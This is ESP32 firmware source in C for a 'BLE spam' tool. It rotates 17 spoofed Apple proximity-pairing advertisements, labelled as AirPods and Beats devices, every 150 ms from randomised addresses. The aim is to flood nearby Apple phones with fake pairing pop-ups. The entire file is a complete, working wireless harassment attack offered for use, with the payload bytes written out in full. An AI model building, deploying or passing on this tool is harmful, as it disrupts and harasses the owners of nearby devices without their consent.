// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM

#include "poom_ble_spam.h"

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_err.h"
#include "esp_gap_ble_api.h"
#include "esp_random.h"

#include "freertos/FreeRTOS.h"
#include "freertos/timers.h"

/**
 * @file poom_ble_spam.c
 * @brief BLE advertisement payload rotator application.
 */

/* =========================
 * Local log macros (printf)
 * ========================= */
#if POOM_BLE_SPAM_LOG_ENABLED
    static const char *POOM_BLE_SPAM_TAG = "poom_ble_spam";

    #define POOM_BLE_SPAM_PRINTF_E(fmt, ...) \
        printf("[E] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_BLE_SPAM_PRINTF_W(fmt, ...) \
        printf("[W] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_BLE_SPAM_PRINTF_I(fmt, ...) \
        printf("[I] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #if POOM_BLE_SPAM_DEBUG_LOG_ENABLED
        #define POOM_BLE_SPAM_PRINTF_D(fmt, ...) \
            printf("[D] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)
    #else
        #define POOM_BLE_SPAM_PRINTF_D(...) do { } while (0)
    #endif
#else
    #define POOM_BLE_SPAM_PRINTF_E(...) do { } while (0)
    #define POOM_BLE_SPAM_PRINTF_W(...) do { } while (0)
    #define POOM_BLE_SPAM_PRINTF_I(...) do { } while (0)
    #define POOM_BLE_SPAM_PRINTF_D(...) do { } while (0)
#endif

/* =========================
 * Local constants
 * ========================= */
#define ARRAY_LEN(x)                               (sizeof(x) / sizeof((x)[0]))

#define POOM_BLE_SPAM_ADV_DATA_LEN                (31U)
#define POOM_BLE_SPAM_DEFAULT_DWELL_MS            (150U)
#define POOM_BLE_SPAM_ADV_INTERVAL_FAST           (0x20U)
#define POOM_BLE_SPAM_ADDR_CLEAR_MASK             (0x3FU)
#define POOM_BLE_SPAM_ADDR_STATIC_MASK            (0xC0U)
#define POOM_BLE_SPAM_ADDR_MIX_FACTOR_A           (31U)
#define POOM_BLE_SPAM_ADDR_MIX_FACTOR_B           (47U)
#define POOM_BLE_SPAM_TIMER_NAME                  "bleSpamCut"

/* =========================
 * Device payload database
 * ========================= */
static const uint8_t s_device_adv_raw[][POOM_BLE_SPAM_ADV_DATA_LEN] = {
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};

static const char *s_device_names[] = {
    "Airpods",
    "Airpods Pro",
    "Airpods Max",
    "Airpods Gen 2",
    "Airpods Gen 3",
    "Airpods Pro Gen 2",
    "Power Beats",
    "Power Beats Pro",
    "Beats Solo Pro",
    "Beats Studio Buds",
    "Beats Flex",
    "Beats X",
    "Beats Solo 3",
    "Beats Studio 3",
    "Beats Studio Pro",
    "Beats Fit Pro",
    "Beats Studio Buds Plus",
};

/* =========================
 * Local state
 * ========================= */
static uint32_t s_dwell_ms = POOM_BLE_SPAM_DEFAULT_DWELL_MS;
static bool s_running = false;
static int s_current_device_idx = -1;
static TimerHandle_t s_adv_cut_timer = NULL;
static poom_ble_spam_cb_display s_display_cb = NULL;

static esp_ble_adv_params_t s_adv_params = {
    .adv_int_min = POOM_BLE_SPAM_ADV_INTERVAL_FAST,
    .adv_int_max = POOM_BLE_SPAM_ADV_INTERVAL_FAST,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

/* =========================
 * Local helpers
 * ========================= */
/**
 * @brief Fills a buffer with pseudo-random bytes from ESP RNG.
 *
 * @param buffer Output buffer.
 * @param size Number of bytes to fill.
 */
static void poom_ble_spam_fill_random_bytes_(uint8_t *buffer, size_t size)
{
    size_t offset = 0U;
    while (offset < size)
    {
        uint32_t rnd = esp_random();
        size_t remaining = size - offset;
        size_t chunk = (remaining < sizeof(rnd)) ? remaining : sizeof(rnd);
        memcpy(&buffer[offset], &rnd, chunk);
        offset += chunk;
    }
}

/**
 * @brief Applies a random static BLE address mixed with a payload index.
 *
 * @param idx Payload index.
 */
static void poom_ble_spam_set_random_addr_for_index_(int idx)
{
    esp_bd_addr_t random_addr = {0};
    poom_ble_spam_fill_random_bytes_(random_addr, sizeof(random_addr));

    /* Random static address requires top two bits set to 1. */
    random_addr[0] = (uint8_t)((random_addr[0] & POOM_BLE_SPAM_ADDR_CLEAR_MASK) | POOM_BLE_SPAM_ADDR_STATIC_MASK);
    random_addr[5] ^= (uint8_t)(idx * (int)POOM_BLE_SPAM_ADDR_MIX_FACTOR_A);
    random_addr[4] ^= (uint8_t)(idx * (int)POOM_BLE_SPAM_ADDR_MIX_FACTOR_B);

    esp_err_t ret = esp_ble_gap_set_rand_addr(random_addr);
    if (ret != ESP_OK)
    {
        POOM_BLE_SPAM_PRINTF_W("set random addr failed: %s", esp_err_to_name(ret));
    }
}

/**
 * @brief Selects and configures the next ADV payload.
 */
static void poom_ble_spam_prepare_next_device_(void)
{
    s_current_device_idx++;
    if (s_current_device_idx >= (int)ARRAY_LEN(s_device_adv_raw))
    {
        s_current_device_idx = 0;
    }

    poom_ble_spam_set_random_addr_for_index_(s_current_device_idx);

    if (s_display_cb != NULL)
    {
        s_display_cb(s_device_names[s_current_device_idx]);
    }

    esp_err_t ret = esp_ble_gap_config_adv_data_raw((uint8_t *)s_device_adv_raw[s_current_device_idx],
                                                     POOM_BLE_SPAM_ADV_DATA_LEN);
    if (ret != ESP_OK)
    {
        POOM_BLE_SPAM_PRINTF_E("config adv raw failed: %s", esp_err_to_name(ret));
    }
}

/**
 * @brief FreeRTOS timer callback to stop current advertising cycle.
 *
 * @param timer Timer handle (unused).
 */
static void poom_ble_spam_adv_cut_timer_cb_(TimerHandle_t timer)
{
    (void)timer;
    (void)esp_ble_gap_stop_advertising();
}

/**
 * @brief GAP callback implementing the ADV rotation state machine.
 *
 * @param event GAP event.
 * @param param GAP event data.
 */
static void poom_ble_spam_gap_cb_(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
{
    switch (event)
    {
        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
            if (param->adv_data_cmpl.status == ESP_BT_STATUS_SUCCESS)
            {
                esp_err_t ret = esp_ble_gap_start_advertising(&s_adv_params);
                if (ret != ESP_OK)
                {
                    POOM_BLE_SPAM_PRINTF_E("start advertising failed: %s", esp_err_to_name(ret));
                }
            }
            else
            {
                POOM_BLE_SPAM_PRINTF_E("adv raw set failed: status=%d", (int)param->adv_data_cmpl.status);
            }
            break;

        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
            if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS)
            {
                if (s_adv_cut_timer != NULL)
                {
                    (void)xTimerStop(s_adv_cut_timer, 0);
                    (void)xTimerChangePeriod(s_adv_cut_timer, pdMS_TO_TICKS(s_dwell_ms), 0);
                    (void)xTimerStart(s_adv_cut_timer, 0);
                }
            }
            else
            {
                POOM_BLE_SPAM_PRINTF_E("adv start failed: status=%d", (int)param->adv_start_cmpl.status);
            }
            break;

        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
            if (s_running)
            {
                poom_ble_spam_prepare_next_device_();
            }
            break;

        default:
            break;
    }
}

/**
 * @brief Initializes BLE controller and Bluedroid stack.
 */
static void poom_ble_spam_bt_init_stack_(void)
{
    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));

    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());
}

/* =========================
 * Public API
 * ========================= */
/**
 * @brief Registers a callback used to expose the currently advertised label.
 *
 * @param callback Callback function. Pass NULL to clear.
 */
void poom_ble_spam_register_cb(poom_ble_spam_cb_display callback)
{
    s_display_cb = callback;
}

/**
 * @brief Starts BLE payload rotation.
 */
void poom_ble_spam_start(void)
{
    poom_ble_spam_bt_init_stack_();
    ESP_ERROR_CHECK(esp_ble_gap_register_callback(poom_ble_spam_gap_cb_));

    if (s_adv_cut_timer == NULL)
    {
        s_adv_cut_timer = xTimerCreate(POOM_BLE_SPAM_TIMER_NAME,
                                       pdMS_TO_TICKS(s_dwell_ms),
                                       pdFALSE,
                                       NULL,
                                       poom_ble_spam_adv_cut_timer_cb_);
    }

    s_running = true;
    s_current_device_idx = -1;
    poom_ble_spam_prepare_next_device_();
    POOM_BLE_SPAM_PRINTF_I("started");
}

/**
 * @brief Stops BLE payload rotation.
 */
void poom_ble_spam_app_stop(void)
{
    s_running = false;
    if (s_adv_cut_timer != NULL)
    {
        (void)xTimerStop(s_adv_cut_timer, 0);
    }
    (void)esp_ble_gap_stop_advertising();
    POOM_BLE_SPAM_PRINTF_I("stopped");
}
